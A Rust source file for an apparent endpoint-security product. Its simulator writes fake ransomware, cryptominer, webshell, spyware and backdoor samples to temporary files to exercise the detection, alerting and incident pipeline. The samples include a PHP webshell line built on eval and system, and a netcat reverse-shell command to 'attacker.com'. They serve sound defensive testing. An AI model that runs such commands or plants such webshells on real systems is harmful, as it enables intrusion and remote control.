use nkosi_common::config::SimulationScenario;
use nkosi_common::types::*;
use nkosi_db::{Database, DetectionRepository, EventRepository};
use nkosi_engines::{BehaviorEngine, HashEngine, StaticAnalyzer, YaraEngine};
use nkosi_notify::{Alert, AlertDetails, AlertLevel, NotifyManager};
use nkosi_response::ResponseEngine;
use nkosi_risk::RiskEngine;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tempfile::NamedTempFile;
use tokio::sync::Mutex;
use tracing::{info, warn};

use crate::incidents::IncidentManager;

pub struct Simulator {
    hash_engine: Arc<HashEngine>,
    yara_engine: Arc<YaraEngine>,
    static_analyzer: Arc<StaticAnalyzer>,
    _behavior_engine: Arc<BehaviorEngine>,
    risk_engine: Arc<RiskEngine>,
    response_engine: Arc<ResponseEngine>,
    db: Database,
    notify_manager: Arc<NotifyManager>,
    incident_manager: Arc<Mutex<IncidentManager>>,
}

impl Simulator {
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        hash_engine: Arc<HashEngine>,
        yara_engine: Arc<YaraEngine>,
        static_analyzer: Arc<StaticAnalyzer>,
        _behavior_engine: Arc<BehaviorEngine>,
        risk_engine: Arc<RiskEngine>,
        response_engine: Arc<ResponseEngine>,
        db: Database,
        notify_manager: Arc<NotifyManager>,
        incident_manager: Arc<Mutex<IncidentManager>>,
    ) -> Self {
        Self {
            hash_engine,
            yara_engine,
            static_analyzer,
            _behavior_engine,
            risk_engine,
            response_engine,
            db,
            notify_manager,
            incident_manager,
        }
    }

    pub async fn run_scenario(&self, scenario: SimulationScenario) -> anyhow::Result<()> {
        info!("Running simulation scenario: {:?}", scenario);
        match scenario {
            SimulationScenario::Ransomware => self.simulate_ransomware().await,
            SimulationScenario::Cryptominer => self.simulate_cryptominer().await,
            SimulationScenario::Webshell => self.simulate_webshell().await,
            SimulationScenario::Trojan => self.simulate_trojan().await,
            SimulationScenario::Spyware => self.simulate_spyware().await,
            SimulationScenario::Backdoor => self.simulate_backdoor().await,
        }
    }

    pub async fn run_all(&self, scenarios: &[SimulationScenario]) -> anyhow::Result<()> {
        for scenario in scenarios {
            self.run_scenario(scenario.clone()).await?;
        }
        Ok(())
    }

    async fn simulate_ransomware(&self) -> anyhow::Result<()> {
        let content = b"All your files have been encrypted. Pay 0.5 BTC to wallet 1A1zP1... to decrypt. bitcoin decrypt wallet ransom README DECRYPT";
        let path = self.write_temp_file("ransomware_note.txt", content)?;
        self.simulate_file_detection(&path, "Ransomware", "Critical", 95)
            .await
    }

    async fn simulate_cryptominer(&self) -> anyhow::Result<()> {
        let content = b"stratum+tcp://pool.mining.com:3333 xmrig minerd cpuminer difficulty";
        let path = self.write_temp_file("cryptominer_binary", content)?;
        self.simulate_file_detection(&path, "Cryptominer", "High", 85)
            .await
    }

    async fn simulate_webshell(&self) -> anyhow::Result<()> {
        let content = b"<?php eval($_GET['cmd']); system($_POST['cmd']); passthru($_REQUEST['cmd']); shell_exec exec system ?>";
        let path = self.write_temp_file("shell.php", content)?;
        self.simulate_file_detection(&path, "Webshell", "High", 80)
            .await
    }

    async fn simulate_trojan(&self) -> anyhow::Result<()> {
        let mut file = NamedTempFile::new()?;
        file.write_all(b"MZPE\x00\x00fake_trojan_payload")?;
        file.flush()?;
        let path = file.path().to_path_buf();
        let hash = self.hash_engine.compute_sha256(&path)?;
        drop(file);

        let detections = vec![Detection {
            id: uuid::Uuid::new_v4(),
            event_id: uuid::Uuid::new_v4(),
            incident_id: None,
            detection_engine: DetectionEngine::Hash,
            rule_id: Some("SIM-HASH-001".to_string()),
            rule_name: Some("Simulated Trojan Hash".to_string()),
            confidence: 1.0,
            score_contribution: 100,
            details: Some(format!("Simulated hash-match trojan: {}", hash)),
        }];

        self.process_detections(detections, &path, "Trojan").await
    }

    async fn simulate_spyware(&self) -> anyhow::Result<()> {
        let content = b"keylogger screen_capture browser_history exfiltrate credential stealer";
        let path = self.write_temp_file("spyware_module", content)?;
        self.simulate_file_detection(&path, "Spyware", "High", 75)
            .await
    }

    async fn simulate_backdoor(&self) -> anyhow::Result<()> {
        let content = b"nc -e /bin/sh attacker.com 4444 reverse_shell backdoor remote_access";
        let path = self.write_temp_file("backdoor_script.sh", content)?;
        self.simulate_file_detection(&path, "Backdoor", "Critical", 90)
            .await
    }

    async fn simulate_file_detection(
        &self,
        path: &Path,
        malware_family: &str,
        severity: &str,
        base_score: u32,
    ) -> anyhow::Result<()> {
        let mut detections = Vec::new();

        if let Some(det) = self.hash_engine.analyze_file(path) {
            detections.push(det);
        }

        let yara_detections = self.yara_engine.scan_file(path);
        detections.extend(yara_detections);

        if let Some(det) = self.static_analyzer.analyze_file(path) {
            detections.push(det);
        }

        if detections.is_empty() {
            detections.push(Detection {
                id: uuid::Uuid::new_v4(),
                event_id: uuid::Uuid::new_v4(),
                incident_id: None,
                detection_engine: DetectionEngine::StaticAnalysis,
                rule_id: Some("SIM-STATIC-001".to_string()),
                rule_name: Some(format!("Simulated {} Indicators", malware_family)),
                confidence: 0.9,
                score_contribution: base_score,
                details: Some(format!(
                    "Simulated static-analysis detection: {} (severity: {})",
                    malware_family, severity
                )),
            });
        }

        self.process_detections(detections, path, malware_family)
            .await
    }

    async fn process_detections(
        &self,
        detections: Vec<Detection>,
        file_path: &Path,
        malware_family: &str,
    ) -> anyhow::Result<()> {
        let assessment = self.risk_engine.evaluate(detections.clone());

        info!(
            "Simulation risk assessment for {}: score={}, level={:?}",
            file_path.display(),
            assessment.score,
            assessment.level
        );

        let alert_level = match assessment.level {
            RiskLevel::Malicious => AlertLevel::Critical,
            RiskLevel::Suspicious => AlertLevel::Warning,
            RiskLevel::Low => AlertLevel::Info,
            RiskLevel::Clean => AlertLevel::Info,
        };

        if assessment.level != RiskLevel::Clean {
            let _ = self
                .notify_manager
                .notify(Alert {
                    id: uuid::Uuid::new_v4().to_string(),
                    timestamp: chrono::Utc::now(),
                    level: alert_level,
                    title: format!("[SIMULATION] Threat detected: {}", file_path.display()),
                    message: format!(
                        "Risk score: {}/100 ({:?}) - Malware family: {}",
                        assessment.score, assessment.level, malware_family
                    ),
                    source: "simulator".to_string(),
                    details: Some(AlertDetails {
                        file_path: Some(file_path.to_string_lossy().to_string()),
                        process_name: None,
                        pid: None,
                        score: Some(assessment.score),
                        detection_engine: assessment
                            .detections
                            .first()
                            .map(|d| format!("{:?}", d.detection_engine)),
                        threat_type: Some(malware_family.to_string()),
                        action_taken: Some(format!(
                            "{:?}",
                            self.risk_engine.get_recommended_action(&assessment.level)
                        )),
                    }),
                })
                .await;
        }

        let action = self.risk_engine.get_recommended_action(&assessment.level);

        let _ = self
            .response_engine
            .execute_action(
                &action,
                Some(&file_path.to_string_lossy()),
                None,
                None,
                assessment.score,
                &format!("Simulated {} detection", malware_family),
            )
            .await;

        let mut event = Event::new(EventType::Detection, "simulator");
        event.file_path = Some(file_path.to_string_lossy().to_string());
        event.file_hash = self.hash_engine.compute_sha256(file_path).ok();
        event.score = Some(assessment.score);
        event.severity = match assessment.level {
            RiskLevel::Malicious => Severity::Critical,
            RiskLevel::Suspicious => Severity::High,
            RiskLevel::Low => Severity::Medium,
            RiskLevel::Clean => Severity::Info,
        };
        event.action = Some(action);
        event.result = Some(assessment.details);

        let repo = EventRepository::new(&self.db);
        if let Err(e) = repo.insert(&event) {
            warn!("Simulator failed to save event: {}", e);
        }

        let det_repo = DetectionRepository::new(&self.db);
        for detection in &assessment.detections {
            let mut det = detection.clone();
            det.event_id = event.id;
            if let Err(e) = det_repo.insert(&det) {
                warn!("Simulator failed to save detection: {}", e);
            }
        }

        let mut im = self.incident_manager.lock().await;
        im.process_detections(assessment.detections, &event).await;

        Ok(())
    }

    fn write_temp_file(&self, _name: &str, content: &[u8]) -> anyhow::Result<PathBuf> {
        let mut file = NamedTempFile::new()?;
        file.write_all(content)?;
        file.flush()?;
        let path = file.path().to_path_buf();
        std::mem::forget(file);
        Ok(path)
    }
}
